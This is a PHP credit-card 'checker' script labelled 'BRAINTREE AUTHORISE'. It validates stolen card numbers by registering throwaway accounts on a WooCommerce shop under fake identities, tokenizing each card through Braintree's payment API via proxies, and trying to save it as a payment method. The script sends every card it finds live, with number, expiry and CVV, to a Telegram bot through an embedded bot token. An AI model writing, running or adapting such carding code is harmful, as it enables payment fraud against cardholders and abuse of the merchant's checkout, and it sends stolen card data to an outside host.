<?php
include(__DIR__."/Phppot/function.php");
error_reporting(0);
$time_start = microtime(true);
set_time_limit(200);
$GATE = "BRAINTREE AUTHORISE";
extract($_GET);
//lista = "4745034023080410|04|2024|000";
$separator = explode("|", $lista);
$cc = $separator[0];

$ccbin = substr($cc, 0,6);
$mm = $separator[1];
$yy = $separator[2];
$yy1 = substr($yy, 2,2);
$cvv = $separator[3];

$cbin = substr($cc, 0,1);
$rnum = rand(1111,9999);
$binlist = json_decode(fbanklist($bin),true);
$ccbank = $binlist['Bank'];
$ccvendor = $binlist['Vendor'];
$cctype = $binlist['Bank_Info'];
$cc_country = $binlist['Country'];
$abn = $binlist['Abn'];
$cc_emoji = $binlist['emoji'];

$info = json_decode(random_info(),true);
$fname = $info['fname'];
$lname = $info['lname'];
$email = $info['email']; 
$street = $info['street'];
$city = $info['city'];
$state = $info['state'];
$phone = $info['phone'];
$postcode = $info['postcode'];

$cookie = generate_cookie();
$str = RandomString();
$proxy = get_proxies();



 $page =  cURL(
    "https://ukafh.com/my-account/",
    $headers = [
        'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0',
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
    ],
    "",
    "GET",
    1,
    $cookie
);  
$login_nonce = GetStr($page, 'name="woocommerce-login-nonce" value="', '"');
 $register_nonce = GetStr($page, 'name="woocommerce-register-nonce" value="', '"');

  $add_payment = cURL(
    "https://ukafh.com/my-account/",
    $headers = [
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "content-type: application/x-www-form-urlencoded",
        "referer: https://ukafh.com/my-account/",
        "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0"
    ],
    // "username=docugs030401%40aol.com&password=Asdasd123123%40&rememberme=forever&woocommerce-login-nonce=$login_nonce&_wp_http_referer=%2Fmy-account%2F&login=Log+in",
    "email=$email&grecaptcha_required=true&woocommerce-register-nonce=$register_nonce&_wp_http_referer=%2Fmy-account%2Fadd-payment-method%2F&register=Register",
    "POST",
    0   ,
    $cookie
);
 $PAGE = cURL(
    'https://ukafh.com/my-account/',
    $headers = [
        "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
    ],
    "",
    "GET",
    1,
    $cookie

);

$edit_address = cURL(
    'https://ukafh.com/my-account/edit-address/billing/',
    $headers = [
        "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0",
        "referer: https://ukafh.com/my-account/edit-address/",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
    ],
    "",
    "GET",
    1,
    $cookie
);
 $save_address = GetStr($edit_address, 'name="woocommerce-edit-address-nonce" value="', '"');

  $confirm_address = cURL(
    'https://ukafh.com/my-account/edit-address/billing/',
    $headers = [
        "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0",
        "content-type: application/x-www-form-urlencoded",
        "referer: https://ukafh.com/my-account/edit-address/",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
    ],
    "billing_first_name=$fname&billing_last_name=$lname&billing_company=&billing_country=US&billing_address_1=$street&billing_address_2=&billing_city=$city&billing_state=$state&billing_postcode=$postcode&billing_phone=215123124&billing_email=$email&save_address=Save+address&woocommerce-edit-address-nonce=$save_address&_wp_http_referer=%2Fmy-account%2Fedit-address%2Fbilling%2F&action=edit_address",
    "POST",
    0,
    $cookie
);

 $edit_address = cURL(
    'https://ukafh.com/my-account/edit-address/billing/',
    $headers = [
        "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0",
        "referer: https://ukafh.com/my-account/edit-address/",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
    ],
    "",
    "GET",
    1,
    $cookie
);

 $prepare_pm = cURL(
    'https://ukafh.com/my-account/add-payment-method/',
    $headers = [
        "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0",
        "referer: https://ukafh.com/my-account/edit-address/billing/",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
    ],
    "",
    "GET",
    1,
    $cookie

);
$add_pm_nonce = GetStr($prepare_pm, 'name="woocommerce-add-payment-method-nonce" value="', '"');
$data = GetStr($prepare_pm, 'wc_braintree_client_token = ["', '"');
//  $cc_ajax_nonce = GetStr($prepare_pm, '"type":"credit_card","client_token_nonce":"', '"');
//   $ajax = cURL(
//     "https://ukafh.com/wp-admin/admin-ajax.php",
//     $headers = [
//         "accept: */*",
//         "content-type: application/x-www-form-urlencoded; charset=UTF-8",
//         "origin: https://ukafh.com",
//         "referer: https://ukafh.com/my-account/add-payment-method/",
//         "x-requested-with: XMLHttpRequest",
//         "sec-fetch-site: same-origin",
//         "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0"
//     ],
//     'action=wc_braintree_credit_card_get_client_token&nonce=' . $cc_ajax_nonce,
//     "POST",
//     1,
//     $cookie
// );
// $data = json_decode(base64_decode(GetStr($ajax, '"data":"', '"')), true);
 $data = json_decode(base64_decode($data),true);
  $fPrint = $data['authorizationFingerprint'];
 $acc_token = $data['access_token'];


 $graphl = cURL_ProxyOn(
    "https://payments.braintree-api.com/graphql",
    $headers = [
        "accept: */*",
        "Content-Type: application/json",
        "Authorization: Bearer $fPrint",
        "Host: payments.braintree-api.com",
        "Origin: https://assets.braintreegateway.com",
        "Referer: https://assets.braintreegateway.com/",
        "Braintree-Version: 2018-05-10",
        "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0"
    ],
    '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"'.RandomString().'"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mm.'","expirationYear":"'.$yy.'","cvv":"'.$cvv.'","billingAddress":{"postalCode":"90001","streetAddress":"dsadsa"}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}',
    "POST",
    1,
    $cookie
);
 $token = GetStr($graphl, '"token":"', '"');


  $confirm_method = cURL_ProxyOn(
    "https://ukafh.com/my-account/add-payment-method/",
    $headers = [
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "content-type: application/x-www-form-urlencoded",
        "referer: https://ukafh.com/my-account/add-payment-method/",
        "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0"
    ],
    "payment_method=braintree_cc&braintree_cc_nonce_key=$token&braintree_cc_device_data=&woocommerce-add-payment-method-nonce=$add_pm_nonce&_wp_http_referer=%2Fmy-account%2Fadd-payment-method%2F&woocommerce_add_payment_method=1",
    "POST",
    1,
    $cookie
);              
$response = GetStr($confirm_method, 'class="woocommerce-error" role="alert">', "</ul>");
if(strpos($confirm_method, 'Payment method successfully added.')|| strpos($response, 'Duplicate card exists in the vault')){
    $response = "Matched";
}elseif(strpos($response, "Invalid postal code")){
    $response = "Matched - AVS";
} else{
    $response = getstr($confirm_method, 'Reason: ', '</li>');
}

if (strpos($response, "Matched")){
    echo '<tr><td><span class="badge bg-success">LIVE CVV</span></td><td><span> => </span></td><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td> <td><span class="badge badge-success badge-pill">'.$response.'</span> <span class="badge bg-light text-dark">'.$CC_fDets.'</span></td></tr><br>';
    file_get_contents('https://api.telegram.org/bot1405110178:AAFo20MsFbsCxH5tjWoPFKHsOVRgbdUwJWU/sendMessage?chat_id=1087333523&text='.$lista.' '.$GATE);
}elseif (strpos($confirm_method, 'There was an error saving your payment method. Reason: Card Issuer Declined CVV')){
    echo '<tr><td><span class="badge bg-success">LIVE CCN</span></td><td><span> => </span></td><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td> <td><span class="badge badge-success badge-pill">Authorized</span> <span class="badge bg-light text-dark">'.$CC_fDets.'</span></td></tr><br>';
    file_get_contents('https://api.telegram.org/bot1405110178:AAFo20MsFbsCxH5tjWoPFKHsOVRgbdUwJWU/sendMessage?chat_id=1087333523&text='.$lista.' '.$GATE);
}elseif (strpos($confirm_method, 'There was an error saving your payment method')){
    echo '<tr><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td><td><span> => </span></td><td><span class="badge badge-danger badge-pill">"MESSAGE": '.$response.' - Retries: '.$retries.'</span></td><td><span class="badge badge-info badge-pill"> Took '.number_format(microtime(true) - $time_start, 2).' seconds</span></td></tr><br>';
}else {
    echo '<tr><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td><td><span> => </span></td><td><span class="badge badge-danger badge-pill">"MESSAGE": MERCHANT DEAD - Retries: '.$retries.'</span></td><td><span class="badge badge-info badge-pill"> Took '.number_format(microtime(true) - $time_start, 2).' seconds</span></td></tr><br>';
}